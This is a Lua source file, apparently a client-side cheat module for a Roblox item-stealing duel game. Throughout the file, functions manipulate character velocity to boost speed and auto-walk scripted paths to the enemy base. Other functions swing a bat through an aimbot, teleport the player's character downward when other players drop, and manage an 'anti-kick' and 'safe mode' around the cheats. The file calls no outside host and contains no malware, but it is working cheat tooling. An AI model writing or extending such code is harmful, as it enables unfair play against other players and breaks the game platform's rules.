function M.ensureNotUnwalkStuck() end

function M.cursedInstaReset()
    
    return
end

function M.hasBrainrotInHand()
    local char = player.Character
    if not char then return false end
    
    local ok, val = pcall(function() return player:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok2 and val2 == true then return true end
    for _, item in ipairs(char:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            if name:find("brainrot", 1, true)
                or name:find("skibidi", 1, true)
                or name:find("toilet", 1, true)
                or name:find("steal", 1, true)
                or name:find("animal", 1, true)
                or name:find("pet", 1, true)
            then
                
                if not (name:find("slap", 1, true) or name:find("bat", 1, true)) then
                    return true
                end
            end
        end
    end
    return false
end

function M.forceLaggerCarryWhileHolding()
    
    return M.hasBrainrotInHand()
end


function M.refreshSpeedCustomKeybindLabels()
    local custom = (M.speedUIMode or "Original") == "Customizer"
    local refs = M.keybindLabelRefs
    if not refs then return end
    local map = {
        [M.KB.SpeedToggle] = custom and "Carry Mode [Speed Custom]" or "Carry Mode",
        [M.KB.LaggerToggle] = custom and "Lagger Mode [Speed Custom]" or "Lagger Mode",
        [M.KB.LaggerCarry] = custom and "Lagger Carry [Speed Custom]" or "Lagger Carry [2x Lagger Mode]",
    }
    for entry, text in pairs(map) do
        local l = refs[entry]
        if l and l.Parent then l.Text = text end
    end
end

function M.toggleCarryMode()
    
    M.carrySpeedActive = not M.carrySpeedActive
    if M.carrySpeedActive then
        M.laggerCarryActive = false
        M.laggerModeEnabled = false
        M.speedBoosterPath = "Normal"
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.speedBoosterSyncPath then pcall(function() M.speedBoosterSyncPath("Normal") end) end
    end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.carryModeBtn then
        M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
    end
    if M.speedBoosterRefresh then pcall(M.speedBoosterRefresh) end
    saveCherryConfig()
end

function M.toggleLaggerMode()
    
    M.laggerModeEnabled = not M.laggerModeEnabled
    if M.laggerModeEnabled then
        M.speedBoosterPath = "Lagger"
        M.carrySpeedActive = false
        if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
        if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    else
        M.speedBoosterPath = "Normal"
        M.laggerCarryActive = false
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.laggerModeBtn then
        M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
    end
    if M.speedBoosterSyncPath then pcall(function() M.speedBoosterSyncPath(M.speedBoosterPath) end) end
    if M.speedBoosterRefresh then pcall(M.speedBoosterRefresh) end
    saveCherryConfig()
end

function M.cycleLaggerModeBind()
    
    
    if not M.laggerModeEnabled and not M.laggerCarryActive then
        
        M.laggerModeEnabled = true
        M.laggerCarryActive = false
        M.carrySpeedActive = false
        M.speedBoosterPath = "Lagger"
    elseif M.laggerModeEnabled and not M.laggerCarryActive then
        
        M.laggerCarryActive = true
        M.laggerModeEnabled = true
        M.carrySpeedActive = false
        M.speedBoosterPath = "Lagger"
    else
        
        M.laggerCarryActive = false
        M.laggerModeEnabled = true
        M.carrySpeedActive = false
        M.speedBoosterPath = "Lagger"
    end
    if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(false) end) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(M.laggerModeEnabled) end) end
    if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
    if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end) end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
    if M.speedBoosterSyncPath then pcall(function() M.speedBoosterSyncPath(M.speedBoosterPath) end) end
    if M.refreshSpeedModeLabel then pcall(M.refreshSpeedModeLabel) end
    if M.speedBoosterRefresh then pcall(M.speedBoosterRefresh) end
    pcall(saveCherryConfig)
end


function M._syncSpeedModeVisuals()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
    saveCherryConfig()
end

function M.toggleLaggerCarry()
    M.laggerCarryActive = not M.laggerCarryActive
    if M.laggerCarryActive then
        M.carrySpeedActive = false
        M.speedBoosterPath = "Lagger"
        M.laggerModeEnabled = true
        if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
        if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(true) end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag On" end
        if M.speedBoosterSyncPath then pcall(function() M.speedBoosterSyncPath("Lagger") end) end
    end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    if M.speedBoosterRefresh then pcall(M.speedBoosterRefresh) end
    saveCherryConfig()
end





function M.safeMoveDirection(hrp, hum, dir, spd, dt)
    if not hrp or not dir then return end
    local flat = Vector3.new(dir.X, 0, dir.Z)
    if flat.Magnitude < 0.01 then
        if hum then pcall(function() hum:Move(Vector3.zero, false) end) end
        return
    end
    flat = flat.Unit
    spd = tonumber(spd) or M.NS or 60
    
    local cap = tonumber(M.antiFlingMaxSpeed) or 120
    if spd > cap then spd = cap end
    dt = dt or (1/60)
    
    if M.applySpeedMethod then
        pcall(function() M.applySpeedMethod(hrp, hum, flat, spd, dt) end)
        if hum then pcall(function() hum:Move(flat, false) end) end
        return
    end
    
    local mass = hrp.AssemblyMass or 1
    local current = hrp.AssemblyLinearVelocity
    local desired = Vector3.new(flat.X * spd, current.Y, flat.Z * spd)
    local delta = desired - current
    pcall(function()
        hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass)
    end)
    if hum then pcall(function() hum:Move(flat, false) end) end
end

function M.safeStopMove(hrp, hum)
    if hum then pcall(function() hum:Move(Vector3.zero, false) end) end
    if not hrp then return end
    
    pcall(function()
        local mass = hrp.AssemblyMass or 1
        local current = hrp.AssemblyLinearVelocity
        local delta = Vector3.new(-current.X, 0, -current.Z)
        hrp:ApplyImpulse(delta * mass * 0.85)
    end)
end

function M.stopAutoLeft()
    M.autoLeftEnabled = false
    if M.alConn then M.alConn:Disconnect(); M.alConn = nil end
    M.alPhase = 1
    local char = player.Character
    if char then
        local h = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        M.safeStopMove(root, h)
    end
    if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
end

function M.stopAutoRight()
    M.autoRightEnabled = false
    if M.arConn then M.arConn:Disconnect(); M.arConn = nil end
    M.arPhase = 1
    local char = player.Character
    if char then
        local h = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        M.safeStopMove(root, h)
    end
    if M.autoRightSetVisual then M.autoRightSetVisual(false) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
end


function M.startAutoLeft()
    if M.alConn then M.alConn:Disconnect() end
    M.alPhase = 1
    M.autoLeftEnabled = true
    M.alConn = RunService.Heartbeat:Connect(function(dt)
        if not M.autoLeftEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        local spd = (M.getAutoPathSpeed and M.getAutoPathSpeed()) or (M.NS or 60)
        if M.alPhase == 1 then
            local tgt = Vector3.new(M.AP_L1.X, hrp.Position.Y, M.AP_L1.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.alPhase = 2
                local d = M.AP_L2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z)
                if mv.Magnitude > 0.01 then mv = mv.Unit end
                M.safeMoveDirection(hrp, hum, mv, spd, dt)
                return
            end
            local d = M.AP_L1 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            M.safeMoveDirection(hrp, hum, mv, spd, dt)
        elseif M.alPhase == 2 then
            local tgt = Vector3.new(M.AP_L2.X, hrp.Position.Y, M.AP_L2.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.safeStopMove(hrp, hum)
                M.autoLeftEnabled = false
                if M.alConn then M.alConn:Disconnect(); M.alConn = nil end
                M.alPhase = 1
                if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
                if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
                
                if M.autoPlayEnabled and M.autoPlayLockedDir then
                    task.defer(function()
                        if M.autoPlayEnabled and M.autoPlayLockedDir then
                            M._runLockedAutoPlayPath()
                        end
                    end)
                end
                return
            end
            local d = M.AP_L2 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            M.safeMoveDirection(hrp, hum, mv, spd, dt)
        end
        if M.autoMoveSwingEnabled and not M._alSwingDebounce then
            M._alSwingDebounce = true
            local bat = M.findBat and M.findBat() or (M.findBatForAimbot and M.findBatForAimbot())
            if bat then
                if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(M.autoMoveSwingInterval or 0.3, function() M._alSwingDebounce = false end)
        end
    end)
end

function M.startAutoRight()
    if M.arConn then M.arConn:Disconnect() end
    M.arPhase = 1
    M.autoRightEnabled = true
    M.arConn = RunService.Heartbeat:Connect(function(dt)
        if not M.autoRightEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        local spd = (M.getAutoPathSpeed and M.getAutoPathSpeed()) or (M.NS or 60)
        if M.arPhase == 1 then
            local tgt = Vector3.new(M.AP_R1.X, hrp.Position.Y, M.AP_R1.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.arPhase = 2
                local d = M.AP_R2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z)
                if mv.Magnitude > 0.01 then mv = mv.Unit end
                M.safeMoveDirection(hrp, hum, mv, spd, dt)
                return
            end
            local d = M.AP_R1 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            M.safeMoveDirection(hrp, hum, mv, spd, dt)
        elseif M.arPhase == 2 then
            local tgt = Vector3.new(M.AP_R2.X, hrp.Position.Y, M.AP_R2.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.safeStopMove(hrp, hum)
                M.autoRightEnabled = false
                if M.arConn then M.arConn:Disconnect(); M.arConn = nil end
                M.arPhase = 1
                if M.autoRightSetVisual then M.autoRightSetVisual(false) end
                if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
                
                if M.autoPlayEnabled and M.autoPlayLockedDir then
                    task.defer(function()
                        if M.autoPlayEnabled and M.autoPlayLockedDir then
                            M._runLockedAutoPlayPath()
                        end
                    end)
                end
                return
            end
            local d = M.AP_R2 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            M.safeMoveDirection(hrp, hum, mv, spd, dt)
        end
        if M.autoMoveSwingEnabled and not M._arSwingDebounce then
            M._arSwingDebounce = true
            local bat = M.findBat and M.findBat() or (M.findBatForAimbot and M.findBatForAimbot())
            if bat then
                if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(M.autoMoveSwingInterval or 0.3, function() M._arSwingDebounce = false end)
        end
    end)
end







function M.getPlayerSide()
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return "left" end
    local midZ = ((M.AP_L1 and M.AP_L1.Z or 93) + (M.AP_R1 and M.AP_R1.Z or 25)) * 0.5
    if hrp.Position.Z >= midZ then
        return "left"
    end
    return "right"
end

function M.setAutoPlayVisual(on)
    on = on and true or false
    M.autoPlayEnabled = on
    if M.autoPlaySetVisual then pcall(function() M.autoPlaySetVisual(on) end) end
    if M.mobBtnRefs and M.mobBtnRefs.autoPlay then pcall(function() M.mobBtnRefs.autoPlay(on) end) end
    if not on then
        if M.autoLeftSetVisual then pcall(function() M.autoLeftSetVisual(false) end) end
        if M.autoRightSetVisual then pcall(function() M.autoRightSetVisual(false) end) end
        if M.mobBtnRefs and M.mobBtnRefs.autoLeft then pcall(function() M.mobBtnRefs.autoLeft(false) end) end
        if M.mobBtnRefs and M.mobBtnRefs.autoRight then pcall(function() M.mobBtnRefs.autoRight(false) end) end
    end
end

function M._runLockedAutoPlayPath()
    
    local dir = M.autoPlayLockedDir
    if not dir then return end
    if dir == "right" then
        M.autoLeftEnabled = false
        M.autoRightEnabled = true
        M.startAutoRight()
    else
        M.autoRightEnabled = false
        M.autoLeftEnabled = true
        M.startAutoLeft()
    end
end

function M.stopAutoPlay()
    M.autoPlayEnabled = false
    M.autoPlayLockedDir = nil
    pcall(function() M.stopAutoLeft() end)
    pcall(function() M.stopAutoRight() end)
    M.setAutoPlayVisual(false)
end

function M.startAutoPlay()
    if M.safeModeTryStart and not M.safeModeTryStart() then return end
    if M.autoBatEnabled then
        pcall(function() M.stopBatAimbot() end)
        if M.autoBatSetVisual then M.autoBatSetVisual(false) end
        if M.mobBtnRefs and M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(false) end
    end
    pcall(function() M.stopAutoLeft() end)
    pcall(function() M.stopAutoRight() end)

    
    local side = M.getPlayerSide()
    if side == "left" then
        M.autoPlayLockedDir = "right" 
    else
        M.autoPlayLockedDir = "left"  
    end

    M.autoPlayEnabled = true
    M.setAutoPlayVisual(true)
    M._runLockedAutoPlayPath()
end

function M.toggleAutoPlay()
    if M.autoPlayEnabled or M.autoLeftEnabled or M.autoRightEnabled then
        M.stopAutoPlay()
    else
        M.startAutoPlay()
    end
    return M.autoPlayEnabled
end

function M.enableAntiKick()
    M.antiKickEnabled = true
    task.spawn(function()
        while M.antiKickEnabled do
            task.wait(0.5)
            local char = player.Character
            if char then
                local found = false
                for _, tool in ipairs(char:GetChildren()) do
                    if tool:IsA("Tool") then
                        local n = tool.Name:lower()
                        if n:find("brainrot") or n:find("skibidi") or n:find("toilet") then
                            found = true
                            break
                        end
                    end
                end
                M.brainrotDetected = found
                if found then
                    if M.autoBatEnabled then M.stopBatAimbot() end
                    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
                    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
                end
            end
        end
    end)
end

function M.disableAntiKick()
    M.antiKickEnabled = false
    M.brainrotDetected = false
end




function M.safeModeGetCountdownLabel()
    local ok, label = pcall(function()
        local pg = player:FindFirstChild("PlayerGui")
        if not pg then return nil end
        local top = pg:FindFirstChild("DuelsMachineTopFrame")
        if not top then return nil end
        local inner = top:FindFirstChild("DuelsMachineTopFrame")
        if not inner then return nil end
        local timer = inner:FindFirstChild("Timer")
        if not timer then return nil end
        return timer:FindFirstChild("Label")
    end)
    return (ok and label) or nil
end

function M.safeModeCountdownNumber(text)
    local t = tostring(text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
    if t == "GO" or t == "START" or t == "READY" then return true end
    local n = tonumber(t)
    return n ~= nil and n >= 0 and n <= 10
end

function M.safeModeInDuelCountdown()
    local label = M.safeModeGetCountdownLabel()
    return label and M.safeModeCountdownNumber(label.Text) or false
end

M.SAFE_MODE_BLOCKED_TOOLS = {
    bat=true, slap=true, sword=true, gun=true, pistol=true, rifle=true,
    medusa=true, hammer=true, axe=true, knife=true, katana=true, blade=true, fist=true,
}

function M.safeModeIsCarryableTool(tool)
    if not tool or not tool:IsA("Tool") then return false end
    local name = tool.Name:lower()
    for word in pairs(M.SAFE_MODE_BLOCKED_TOOLS) do
        if name:find(word, 1, true) then return false end
    end
    return true
end

function M.safeModeHoldingBrainrot()
    local ok, val = pcall(function() return player:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return player:GetAttribute("AntiKick") end)
    if ok2 and val2 == true then return true end
    local char = player.Character
    if not char then return false end
    local ok3, val3 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok3 and val3 == true then return true end
    if M.brainrotDetected then return true end
    if M.hasBrainrotInHand and M.hasBrainrotInHand() then return true end
    for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
        local v = char:FindFirstChild(name, true)
        if v then
            if v:IsA("BoolValue") and v.Value then return true end
            if v:IsA("ObjectValue") and v.Value then return true end
            if v:IsA("StringValue") and v.Value ~= "" then return true end
        end
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
            local n = child.Name:lower()
            if n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold") then
                return true
            end
        end
    end
    return false
end

function M.safeModeIsLocked()
    if not M.safeModeEnabled then return false end
    return M.safeModeInDuelCountdown() or M.safeModeHoldingBrainrot()
end

function M.safeModeForceStop(reason)
    local stopped = false
    if M.autoBatEnabled then
        M.stopBatAimbot()
        stopped = true
    end
    if M.bypassAimbotEnabled then
        M.stopBypassAimbot()
        stopped = true
    end
    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
        stopped = true
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
        stopped = true
    end
    if stopped then
        
        pcall(function()
            if type(showActionNotification) == "function" then
                showActionNotification(reason or "SAFE MODE LOCK")
            end
        end)
    end
end

function M.safeModeTryStart()
    if M.safeModeIsLocked() then
        M.safeModeForceStop("SAFE MODE LOCK")
        return false
    end
    return true
end

function M.enableSafeMode()
    M.safeModeEnabled = true
end

function M.disableSafeMode()
    M.safeModeEnabled = false
end

if not M._safeModeMonitorStarted then
    M._safeModeMonitorStarted = true
    RunService.Heartbeat:Connect(function()
        if M.safeModeEnabled and M.safeModeIsLocked() then
            M.safeModeForceStop("SAFE MODE LOCK")
        end
    end)
end




function M.mirrorTPAimbotActive()
    
    return M.autoBatEnabled == true or M.bypassAimbotEnabled == true
end

function M.mirrorTPApplyOnce()
    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health <= 0 then return false end
    local _, yaw = root.CFrame:ToEulerAnglesYXZ()
    local y = M.MIRROR_TP_DOWN_Y or -7.00
    root.CFrame = CFrame.new(root.Position.X, y, root.Position.Z) * CFrame.Angles(0, yaw, 0)
    pcall(function()
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
    end)
    return true
end

function M.mirrorTPTeleportDown()
    
    if not M.mirrorTPAimbotActive() then return end
    local now = tick()
    if now - (M.mirrorTPLastTeleport or 0) < 0.25 then return end
    M.mirrorTPLastTeleport = now
    if not M.mirrorTPApplyOnce() then return end
    
    task.delay(0.06, function()
        if not M.mirrorTPAimbotActive() then return end
        if not M.mirrorTPDownEnabled then return end
        M.mirrorTPApplyOnce()
    end)
end

if not M._mirrorTPStarted then
    M._mirrorTPStarted = true
    local _mAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        
        if not M.mirrorTPDownEnabled or not M.mirrorTPAimbotActive() then
            if next(M.mirrorTPPreviousY) then
                table.clear(M.mirrorTPPreviousY)
            end
            return
        end
        _mAcc = _mAcc + (dt or 0.016)
        if _mAcc < 0.08 then return end
        _mAcc = 0
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local currentY = root.Position.Y
                    local previousY = M.mirrorTPPreviousY[plr.UserId]
                    if previousY and previousY - currentY >= (M.MIRROR_TP_DROP_THRESHOLD or 3) then
                        pcall(M.mirrorTPTeleportDown)
                        table.clear(M.mirrorTPPreviousY)
                        return
                    end
                    M.mirrorTPPreviousY[plr.UserId] = currentY
                end
            end
        end
    end)
end

function M.setMirrorTPDown(enabled)
    M.mirrorTPDownEnabled = enabled == true
    if not M.mirrorTPDownEnabled then
        table.clear(M.mirrorTPPreviousY)
    end
    if M.setMirrorTPVisual then M.setMirrorTPVisual(M.mirrorTPDownEnabled) end
end



function M.isNearEnemyBase(range)
    range = tonumber(range) or M.autoCarryEnemyBaseRange or 35
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local myPos = hrp.Position
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") and not isMyPlot(plot.Name) then
            local pos
            local ok, pivot = pcall(function() return plot:GetPivot().Position end)
            if ok and pivot then
                pos = pivot
            else
                local sign = plot:FindFirstChild("PlotSign")
                if sign and sign:IsA("BasePart") then
                    pos = sign.Position
                elseif sign then
                    local pp = sign:FindFirstChildWhichIsA("BasePart", true)
                    if pp then pos = pp.Position end
                end
            end
            if pos then
                local flat = Vector3.new(myPos.X - pos.X, 0, myPos.Z - pos.Z)
                if flat.Magnitude <= range then
                    return true
                end
            end
        end
    end
    return false
end

function M.enableCarryModeOnly()
    if M.carrySpeedActive then return end 
    M.carrySpeedActive = true
    if M.carryModeBtn then
        M.carryModeBtn.Text = "Carry On"
    end
    if M.mobBtnRefs.carrySpeed then
        pcall(function() M.mobBtnRefs.carrySpeed(true) end)
    end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end

function M.startAutoCarryEnemyBase()
    if M._autoCarryEnemyBaseConn then return end
    local acc = 0
    M._autoCarryEnemyBaseConn = RunService.Heartbeat:Connect(function(dt)
        if not M.autoCarryEnemyBaseEnabled then return end
        acc = acc + (dt or 0.016)
        if acc < 0.2 then return end
        acc = 0
        if M.carrySpeedActive then return end 
        if M.isNearEnemyBase(M.autoCarryEnemyBaseRange) then
            M.enableCarryModeOnly()
        end
    end)
end

function M.stopAutoCarryEnemyBase()
    if M._autoCarryEnemyBaseConn then
        pcall(function() M._autoCarryEnemyBaseConn:Disconnect() end)
        M._autoCarryEnemyBaseConn = nil
    end
end

function M.setAutoCarryEnemyBase(on)
    M.autoCarryEnemyBaseEnabled = on and true or false
    if M.autoCarryEnemyBaseEnabled then
        M.startAutoCarryEnemyBase()
    else
        M.stopAutoCarryEnemyBase()
        
    end
end

function M.isStealState()
    
    local char = player.Character
    if not char then return false end
    if M.hasBrainrotInHand() then return true end
    local h = char:FindFirstChildOfClass("Humanoid")
    if h and h.WalkSpeed < 25 then return true end
    local ok, val = pcall(function() return player:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok2 and val2 == true then return true end
    return false
end

function M.getActiveMoveSpeed()
    local uiMode = M.speedUIMode or "Original"
    local isSteal = false
    pcall(function() isSteal = M.isStealState and M.isStealState() == true end)
    local holding = false
    pcall(function()
        if M.hasBrainrotInHand and M.hasBrainrotInHand() then holding = true end
    end)

    local ns = tonumber(M.NS) or 60
    local cs = tonumber(M.CS) or 30
    local ls = tonumber(M.LAGGER_SPEED) or 15
    local lcs = tonumber(M.LAGGER_CARRY_SPEED) or 24.5

    
    if uiMode == "Original" then
        if M.autoSwitchSpeedEnabled then
            if M.laggerCarryActive then return lcs end
            if M.laggerModeEnabled then
                return (isSteal or holding) and lcs or ls
            end
            if M.carrySpeedActive or isSteal or holding then return cs end
            return ns
        end
        if M.laggerCarryActive then return lcs end
        if M.laggerModeEnabled then return ls end
        if M.carrySpeedActive then return cs end
        return ns
    end

    
    
    
    if M.speedBoosterEnabled == false then
        return 16
    end
    
    if M.laggerCarryActive then return lcs end
    if M.carrySpeedActive then return cs end
    local useLagger = (tostring(M.speedBoosterPath) == "Lagger") or (M.laggerModeEnabled == true)
    if useLagger then
        if holding then return lcs end
        return ls
    end
    if holding then return cs end
    return ns
end

function M.getAutoPathSpeed()
    if M.laggerModeEnabled or M.laggerCarryActive then return M.LAGGER_SPEED
    else return M.NS end
end

function M.setModeNormalFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end

function M.setModeCarryFlags()
    M.carrySpeedActive = true
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(true) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry On" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end

function M.setModeLaggerCarryFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = true
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end

function M.stopWalkSpeedAutoSwitch()
    if M._autoSwitchSpeedConn then
        pcall(function() M._autoSwitchSpeedConn:Disconnect() end)
        M._autoSwitchSpeedConn = nil
    end
end

function M.startWalkSpeedAutoSwitch()
    if M._autoSwitchSpeedConn then return end
    M._autoSwitchSpeedConn = RunService.Heartbeat:Connect(function()
        if not M.autoSwitchSpeedEnabled and not M.autoTurnOffSpeedEnabled and not M.autoSwitchLaggerSpeedEnabled then
            M.stopWalkSpeedAutoSwitch()
            return
        end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local ws = hum.WalkSpeed or 16
        local thr = tonumber(M.AUTO_SWITCH_THRESHOLD) or 25

        
        
        if M.autoTurnOffSpeedEnabled and ws > thr and M.carrySpeedActive and not M.autoSwitchSpeedEnabled then
            
        end
    end)
end

function M.refreshWalkSpeedAutoSwitch()
    if M.autoSwitchSpeedEnabled or M.autoTurnOffSpeedEnabled or M.autoSwitchLaggerSpeedEnabled then
        M.startWalkSpeedAutoSwitch()
    else
        M.stopWalkSpeedAutoSwitch()
    end
end

function M.updateAutoSwitchSpeed()
    
    if M.autoSwitchSpeedEnabled or M.autoSwitchLaggerSpeedEnabled then
        if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    end
end



function M.isRagdollState(hum)
    if not hum then return true end;local st=hum:GetState()
    return hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown
end

function M.runDrop()
    
    if M.dropActive then return end
    pcall(function() if M.stopAutoTPForAction then M.stopAutoTPForAction() end end)
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    M._lastDropTime = M._lastDropTime or 0
    if tick() - M._lastDropTime < 0.15 then return end
